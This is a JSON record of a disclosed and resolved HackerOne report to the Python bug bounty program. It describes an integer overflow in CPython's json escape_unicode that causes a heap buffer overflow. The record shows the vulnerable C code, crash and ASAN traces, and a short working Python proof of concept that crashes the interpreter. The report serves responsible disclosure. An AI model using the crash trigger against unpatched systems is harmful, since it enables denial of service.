{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": null, 
    "voters": [], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "1000.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 73260, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2015-06-27T00:00:00.000Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Integer overflow in _json_encode_unicode leads to crash", 
    "is_member_of_team?": null, 
    "vote_count": 0, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": null, 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$1,000", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2015-06-30T11:46:48.589Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-06-30T11:46:48.589Z", 
            "actor": {
                "url": "/ibb-python", 
                "profile": {
                    "name": "Python (IBB)"
                }, 
                "ibb": true, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/027/79e9602e5e25d02b7c34cdbc40438408f47e7cd7_medium.png?1383737131"
                }
            }, 
            "team_handle": "ibb-python", 
            "bounty_amount": "1000.0", 
            "collaborator": {
                "username": "nilch", 
                "url": "/nilch"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 496273, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "nilch", 
                "url": "/nilch"
            }, 
            "created_at": "2015-06-30T11:46:48.589Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-15T13:29:46.416Z", 
            "actor": {
                "url": "/ibb-python", 
                "profile": {
                    "name": "Python (IBB)"
                }, 
                "ibb": true, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/027/79e9602e5e25d02b7c34cdbc40438408f47e7cd7_medium.png?1383737131"
                }
            }, 
            "team_handle": "ibb-python", 
            "message": null, 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 1196235, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "reporter": {
        "username": "nilch", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/nilch", 
        "profile_picture_urls": {
            "small": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
        }, 
        "is_me?": false
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "disclosed_at": "2015-06-27T00:00:00.000Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/73260", 
    "created_at": "2015-06-27T00:00:00.000Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p><a title=\"http://bugs.python.org/issue24522\" href=\"/redirect?signature=09bce7f464b223459af489b47f5eb91b3ae2fcae&amp;url=http%3A%2F%2Fbugs.python.org%2Fissue24522\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://bugs.python.org/issue24522</span><i class=\"icon-external-link\"></i></a></p>\n<pre class=\"highlight plaintext\"><code># static PyObject *\n# escape_unicode(PyObject *pystr)\n# {\n#     /* Take a PyUnicode pystr and return a new escaped PyUnicode */\n#     Py_ssize_t i;\n#     Py_ssize_t input_chars;\n#     Py_ssize_t output_size;\n#     Py_ssize_t chars;\n#     PyObject *rval;\n#     void *input;\n#     int kind;\n#     Py_UCS4 maxchar;\n# \n#     if (PyUnicode_READY(pystr) == -1)\n#         return NULL;\n# \n#     maxchar = PyUnicode_MAX_CHAR_VALUE(pystr);\n#     input_chars = PyUnicode_GET_LENGTH(pystr);\n#     input = PyUnicode_DATA(pystr);\n#     kind = PyUnicode_KIND(pystr);\n# \n#     /* Compute the output size */\n#     for (i = 0, output_size = 2; i &lt; input_chars; i++) {\n#         Py_UCS4 c = PyUnicode_READ(kind, input, i);\n#         switch (c) {\n#         case &#39;\\\\&#39;: case &#39;&quot;&#39;: case &#39;\\b&#39;: case &#39;\\f&#39;:\n#         case &#39;\\n&#39;: case &#39;\\r&#39;: case &#39;\\t&#39;:\n#             output_size += 2;\n#             break;\n#         default:\n#             if (c &lt;= 0x1f)\n#                 output_size += 6;\n#             else\n#                 output_size++;\n#         }\n#     }\n#\n#     rval = PyUnicode_New(output_size, maxchar);\n#\n# 1.) if c is &lt;= 0x1f then output_size += 6. There are no overflow checks on this variable.\n# 2.) rval buffer is too small to hold results\n#\n# Crash:\n# ------\n#\n# Program received signal SIGSEGV, Segmentation fault.\n# 0xb7a2e9be in escape_unicode (pystr=pystr@entry=0x8cf81018)\n#     at /home/pail/cpython/Modules/_json.c:306\n# 306                ENCODE_OUTPUT;\n#\n# OS info\n# --------\n#  %./python -V\n#  &gt; Python 3.6.0a0\n# % uname -a\n# Linux Pail0verflow 3.13.0-52-generic #85-Ubuntu SMP Wed Apr 29 16:44:56 UTC 2015 i686 i686 i686 GNU/Linux\n#\n# ASAN Info (details in other file)\n# =================================================================\n# ==6512== ERROR: AddressSanitizer: heap-buffer-overflow on address 0xb5c00000 at pc 0xb5f17356 bp 0xbfaa0eb8 sp 0xbfaa0eac\n# WRITE of size 1 at 0xb5c00000 thread T0\n</code></pre>\n<p>import json</p>\n\n<p>sp = &quot;\\x13&quot;<em>715827883 #((2</em>*32)/6 + 1)<br>\njson.dumps([sp], ensure_ascii=False)</p>\n", 
    "vulnerability_information": "http://bugs.python.org/issue24522\n\n```\n# static PyObject *\n# escape_unicode(PyObject *pystr)\n# {\n#     /* Take a PyUnicode pystr and return a new escaped PyUnicode */\n#     Py_ssize_t i;\n#     Py_ssize_t input_chars;\n#     Py_ssize_t output_size;\n#     Py_ssize_t chars;\n#     PyObject *rval;\n#     void *input;\n#     int kind;\n#     Py_UCS4 maxchar;\n# \n#     if (PyUnicode_READY(pystr) == -1)\n#         return NULL;\n# \n#     maxchar = PyUnicode_MAX_CHAR_VALUE(pystr);\n#     input_chars = PyUnicode_GET_LENGTH(pystr);\n#     input = PyUnicode_DATA(pystr);\n#     kind = PyUnicode_KIND(pystr);\n# \n#     /* Compute the output size */\n#     for (i = 0, output_size = 2; i < input_chars; i++) {\n#         Py_UCS4 c = PyUnicode_READ(kind, input, i);\n#         switch (c) {\n#         case '\\\\': case '\"': case '\\b': case '\\f':\n#         case '\\n': case '\\r': case '\\t':\n#             output_size += 2;\n#             break;\n#         default:\n#             if (c <= 0x1f)\n#                 output_size += 6;\n#             else\n#                 output_size++;\n#         }\n#     }\n#\n#     rval = PyUnicode_New(output_size, maxchar);\n#\n# 1.) if c is <= 0x1f then output_size += 6. There are no overflow checks on this variable.\n# 2.) rval buffer is too small to hold results\n#\n# Crash:\n# ------\n#\n# Program received signal SIGSEGV, Segmentation fault.\n# 0xb7a2e9be in escape_unicode (pystr=pystr@entry=0x8cf81018)\n#     at /home/pail/cpython/Modules/_json.c:306\n# 306                ENCODE_OUTPUT;\n#\n# OS info\n# --------\n#  %./python -V\n#  > Python 3.6.0a0\n# % uname -a\n# Linux Pail0verflow 3.13.0-52-generic #85-Ubuntu SMP Wed Apr 29 16:44:56 UTC 2015 i686 i686 i686 GNU/Linux\n#\n# ASAN Info (details in other file)\n# =================================================================\n# ==6512== ERROR: AddressSanitizer: heap-buffer-overflow on address 0xb5c00000 at pc 0xb5f17356 bp 0xbfaa0eb8 sp 0xbfaa0eac\n# WRITE of size 1 at 0xb5c00000 thread T0\n```\n\nimport json\n\nsp = \"\\x13\"*715827883 #((2**32)/6 + 1)\njson.dumps([sp], ensure_ascii=False)\n", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "http://www.python.org/news/security", 
            "about": "", 
            "twitter_handle": "", 
            "name": "Python (IBB)"
        }, 
        "handle": "ibb-python", 
        "url": "https://hackerone.com/ibb-python", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/027/22df52945ba6933f27a1dbc92380fe19a4a1a93d_small.png?1383737131", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/027/79e9602e5e25d02b7c34cdbc40438408f47e7cd7_medium.png?1383737131"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 27, 
        "default_currency": "usd"
    }, 
    "is_published": false
}